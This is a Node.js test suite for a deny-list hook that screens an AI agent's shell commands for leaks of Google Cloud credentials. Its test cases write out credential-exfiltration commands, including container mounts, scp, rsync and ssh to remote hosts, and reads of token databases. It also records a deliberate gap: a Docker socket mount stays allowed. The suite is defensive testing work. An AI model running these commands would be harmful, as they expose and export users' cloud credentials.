import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { accessSync, constants, mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { homedir, tmpdir } from "node:os";
import { join } from "node:path";
import { after, test } from "node:test";

// The guard is a deny-list, so every rule it carries is a promise about what it
// refuses. A promise with no test is a claim, not a guarantee: an earlier
// version of the compose-file branch aborted under `set -e` and turned a deny
// into a silent pass-through, and the docker bind below passed the guard
// untouched for as long as the guard only looked at gcloud invocations.
const HOOK = join(import.meta.dirname, "..", "hooks", "gcloud-guard.sh");

// Strings only; the guard judges the text of a command, and these are the
// spellings it must recognise. Derived from the real home so the suite is not
// tied to one machine.
const GCLOUD = join(homedir(), ".config", "gcloud");
const PROFILES = join(homedir(), ".config", "gcloud-profiles");
const DOCKER_SOCK = "/var/run/docker.sock";

const COMPOSE_WITH_GCLOUD = [
  "services:",
  "  worker:",
  "    image: node",
  "    environment:",
  "      GOOGLE_APPLICATION_CREDENTIALS: /home/node/.config/gcloud/adc.json",
  "    volumes:",
  `      - ${GCLOUD}:/home/node/.config/gcloud:ro`,
  "",
].join("\n");
const COMPOSE_CLEAN = "services:\n  api:\n    image: node\n    volumes:\n      - ./src:/app/src\n";

const root = mkdtempSync(join(tmpdir(), "devo-guard-"));
after(() => rmSync(root, { recursive: true, force: true }));

function project(name, compose) {
  const directory = join(root, name);
  mkdirSync(directory, { recursive: true });
  if (compose) writeFileSync(join(directory, "compose.yaml"), compose);
  return directory;
}

// A directory whose compose file mounts the identity root, and one that does not.
const withRoot = project("with-root", COMPOSE_WITH_GCLOUD);
const cleanProject = project("clean", COMPOSE_CLEAN);
const noCompose = project("empty", null);
const strayCompose = join(root, "stray-compose.yaml");
writeFileSync(strayCompose, COMPOSE_WITH_GCLOUD);

function guard(command, cwd = root) {
  const payload = JSON.stringify({ tool_name: "Bash", cwd, tool_input: { command } });
  return spawnSync(HOOK, { input: payload, encoding: "utf8" });
}

async function check(t, { expected, command, cwd }) {
  await t.test(command.slice(0, 64), () => {
    const result = guard(command, cwd);
    assert.equal(result.status, expected, `expected exit ${expected} for: ${command}\nstderr: ${result.stderr}`);
    if (expected === 2) {
      assert.match(result.stderr, /BLOCKED by gcloud-guard/, "a denial must explain itself");
    } else {
      assert.equal(result.stderr.trim(), "", "an allowed call must stay silent");
    }
  });
}

test("the hook sits where a PreToolUse hook can run it", () => {
  accessSync(HOOK, constants.X_OK);
  assert.equal(spawnSync("sh", ["-n", HOOK]).status, 0, "the hook must parse");
});

test("refuses handing an identity root to a container or to another host", async (t) => {
  const cases = [
    { expected: 2, command: `docker run -v ${GCLOUD}:/root/gc img bash` },
    { expected: 2, command: `docker run -v ${PROFILES}/master:/root/gc:rw img bash` },
    { expected: 2, command: `docker run --volume=${GCLOUD}:/root/.config/gcloud img` },
    { expected: 2, command: `podman run -v ${GCLOUD}:/gc img` },
    { expected: 2, command: "docker cp ctr:/root/.config/gcloud/x ." },
    { expected: 2, command: "docker cp ~/.config/gcloud/active_config ctr:/root/" },
    { expected: 2, command: `rsync -a ${PROFILES}/ host:/tmp/` },
    { expected: 2, command: "ssh somehost 'cat ~/.config/gcloud/active_config'" },
    { expected: 2, command: "scp -r ~/.config/gcloud-profiles/master/ host:/tmp/" },
    { expected: 2, command: "limactl shell vm -- cat ~/.config/gcloud/credentials.db" },
    // The deny must survive being one segment of a longer line.
    { expected: 2, command: `ls -la && docker run -v ${GCLOUD}:/gc img` },
    { expected: 2, command: `true; docker cp ${GCLOUD}/active_config ctr:/root/` },
    // The mount can also live in a compose file, where the command line names
    // neither a path nor gcloud.
    { expected: 2, command: "docker compose up -d", cwd: withRoot },
    { expected: 2, command: "docker-compose up", cwd: withRoot },
    { expected: 2, command: "docker compose -f compose.yaml up -d", cwd: withRoot },
    { expected: 2, command: `docker compose -f ${strayCompose} up -d` },
  ];
  for (const item of cases) await check(t, item);
});

test("leaves ordinary container and shell work alone", async (t) => {
  const cases = [
    { expected: 0, command: "docker run -v /tmp/data:/data img bash" },
    { expected: 0, command: "docker compose up -d", cwd: cleanProject },
    { expected: 0, command: "docker compose up -d", cwd: noCompose },
    { expected: 0, command: "docker compose -f /nonexistent/compose.yaml up -d" },
    { expected: 0, command: "docker ps" },
    { expected: 0, command: "docker inspect dopamina-worker-1" },
    { expected: 0, command: "git status" },
    { expected: 0, command: `ls -la ${PROFILES}` },
  ];
  for (const item of cases) await check(t, item);
});

test("keeps the rules that predate the transfer rules", async (t) => {
  const cases = [
    { expected: 0, command: "gcloud auth list" },
    { expected: 0, command: "CLOUDSDK_CONFIG=/tmp/root gcloud auth login someone@example.com" },
    { expected: 2, command: "gcloud auth login someone@example.com" },
    { expected: 2, command: "gcloud config configurations activate ragusa" },
    { expected: 2, command: "gcloud auth application-default login" },
    { expected: 2, command: "gcloud auth login --update-adc" },
    { expected: 2, command: "cat ~/.config/gcloud/access_tokens.db" },
    { expected: 2, command: "cat ~/.config/gcloud/credentials.db" },
    { expected: 2, command: "cp ~/.config/gcloud/application_default_credentials.json ." },
  ];
  for (const item of cases) await check(t, item);
});

test("leaves the sanctioned routes open", async (t) => {
  const cases = [
    { expected: 0, command: "devo gcloud --profile credilex --project credilex-gstaging -- projects describe credilex-gstaging" },
    { expected: 0, command: "devo profiles --probe" },
    { expected: 0, command: "devo auth status --record --notify" },
    { expected: 0, command: "devo auth repair master" },
    { expected: 0, command: "devo auth watch --install" },
    { expected: 0, command: "launchctl kickstart -k gui/501/com.zencrust.devo-auth-status" },
  ];
  for (const item of cases) await check(t, item);
});

// Compose resolves the project file by walking up from the working directory --
// measured on v2.36, a call in a subdirectory with no compose file of its own
// picks up the parent's. A guard that only read the working directory missed
// `cd sub && docker compose up`, one directory below the check.
test("walks up to the compose file Compose itself would use", async (t) => {
  const nested = join(withRoot, "nested");
  const cleanNested = join(cleanProject, "nested");
  mkdirSync(nested, { recursive: true });
  mkdirSync(cleanNested, { recursive: true });

  await check(t, { expected: 2, command: "docker compose up -d", cwd: nested });
  await check(t, { expected: 0, command: "docker compose up -d", cwd: cleanNested });
});

// A socket mount is a second route to the same place: whoever holds the socket
// can start a container that mounts anything. It stays allowed because the
// socket is how the local container tooling works. Closing it is a separate
// decision, and this test exists so the residual is recorded rather than
// silently assumed to be covered.
test("records the residual it deliberately leaves open", async (t) => {
  await check(t, { expected: 0, command: `docker run --rm -v ${DOCKER_SOCK}:${DOCKER_SOCK} img` });
});
